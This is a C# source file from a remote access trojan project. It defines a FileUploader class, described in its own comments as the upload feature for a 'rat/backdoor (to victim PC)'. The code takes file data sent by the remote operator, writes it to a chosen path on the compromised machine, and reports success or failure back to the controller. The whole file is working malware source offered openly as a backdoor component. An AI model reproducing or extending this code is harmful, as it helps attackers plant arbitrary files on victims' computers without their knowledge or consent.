using RAT.src.Interfaces;
using RAT.src.Models.Enums;
using System;
using System.IO;
using System.Text;

namespace RAT.src.Logic.RatCommands.Features
{
    /// <summary>
    /// File upload feature for rat/backdoor (to victim PC).
    /// </summary>
    public class FileUploader : IFileUploader
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _clientNotificationLogic;

        /// <summary>
        /// File upload feature for rat/backdoor (to victim PC).
        /// </summary>
        /// <param name="stateLogic">Our client/socket current state.</param>
        /// <param name="notificationLogic">Logic for sending notifications to client.</param>
        public FileUploader(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic)
        {
            _socketStateLogic = stateLogic;
            _clientNotificationLogic = notificationLogic;
        }

        /// <summary>
        /// Does preparations for file upload.
        /// </summary>
        /// <param name="path">Path on which file will be uploaded.</param>
        /// <param name="fileSize">Size of file that will be uploaded.</param>
        public void PrepareForFileUpload(string path, int fileSize)
        {
            _socketStateLogic.State.PathForFileUpload = path;
            _socketStateLogic.State.CurrentOperation = CurrentOperation.FileUpload;
            _socketStateLogic.State.FileDataArray = new byte[fileSize];
            _clientNotificationLogic.NotifyClient($"\nReady to get file data on path \"{path}\"\n");
        }

        /// <summary>
        /// Uploads file data to specified path.
        /// </summary>
        /// <param name="path">Path to file that should be created with data.</param>
        /// <param name="data">Data that should be written to created file.</param>
        public void UploadFile(string path, byte[] data)
        {
            bool isErrorOccured = false;
            try
            {
                using (var fileStream = File.Create(path))
                {
                    fileStream.Write(data, 0, data.Length);
                }
            }
            catch (Exception exception)
            {
                isErrorOccured = true;
                _clientNotificationLogic.NotifyClient($"\nError during file upload {exception.Message}\n");
            }

            if (!isErrorOccured)
            {
                _clientNotificationLogic.NotifyClient($"\nFile on path \"{path}\" uploaded successfully\n");
            }
        }
    }
}